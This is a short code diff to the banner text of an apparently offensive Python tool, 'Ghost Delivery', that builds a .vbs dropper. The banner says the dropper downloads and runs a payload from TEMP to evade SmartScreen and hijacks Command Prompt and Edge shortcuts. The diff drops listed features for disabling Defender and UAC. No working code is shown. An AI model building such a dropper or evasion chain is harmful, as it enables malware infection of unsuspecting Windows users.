@@ -5,18 +5,12 @@ import random, sys, string, os, time, base64
 #Use for educational purposes, blah blah
 def prnt():
 	print("""
-				~Ghost Delivery~
+				~Ghost Delivery light~
 		This tool is designed create a .vbs script that:
 
 		*Downloads payload to TEMP directory and executes payload
 		to bypass windows smart screen
-
-		*Disables Defender
-
-		*Disables UAC
-
-		*Disables Defender Notifications
-
+		
 		*Injects Command Prompt and Microsoft Edge
 		shortcuts with payload path
 
